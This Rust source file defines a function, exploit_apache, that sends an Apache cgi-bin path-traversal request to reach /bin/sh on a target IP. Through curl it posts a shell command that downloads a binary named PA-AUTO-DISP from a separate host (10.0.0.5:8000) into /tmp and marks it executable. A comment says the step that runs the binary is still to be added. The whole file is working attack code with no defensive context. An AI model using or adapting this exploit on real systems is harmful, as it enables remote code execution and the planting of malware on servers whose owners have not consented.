use std::process::{Command, Output};

async fn exploit_apache(target_ip: &str) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let url = format!("http://{}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", target_ip);
    let srv:String = format!("10.0.0.5");

    let command_output: Output = Command::new("curl")
        .arg("-X")
        .arg("POST")
        .arg("-d")
        .arg(format!("echo; cd /tmp && wget http://{}:8000/PA-AUTO-DISP && chmod +x PA-AUTO-DISP", srv))//ajouter ./...
        //.arg("echo;id")
        .arg(url)
        .output()
        .map_err(|e| format!("Failed to execute command: {}", e))?;

    if command_output.status.success() {
        let result_str = String::from_utf8_lossy(&command_output.stdout);
        println!("{}", result_str);
        Ok(())
    } else {
        let error_message = String::from_utf8_lossy(&command_output.stderr);
        Err(format!("Failed: {}", error_message).into())
    }
}